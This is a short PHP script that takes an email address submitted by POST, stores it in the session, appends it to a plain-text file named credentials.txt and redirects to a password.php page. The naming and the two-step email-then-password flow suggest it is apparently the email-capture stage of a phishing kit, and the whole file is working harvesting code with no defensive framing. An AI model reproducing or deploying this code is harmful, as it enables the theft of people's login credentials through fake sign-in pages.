<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    session_start();
    $email = $_POST["email"];
    $_SESSION["email"] = $email;

    // Save email to file
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Email: " . $email . "\n");
    fclose($file);

    header("Location: password.php");
    exit();
}
?>
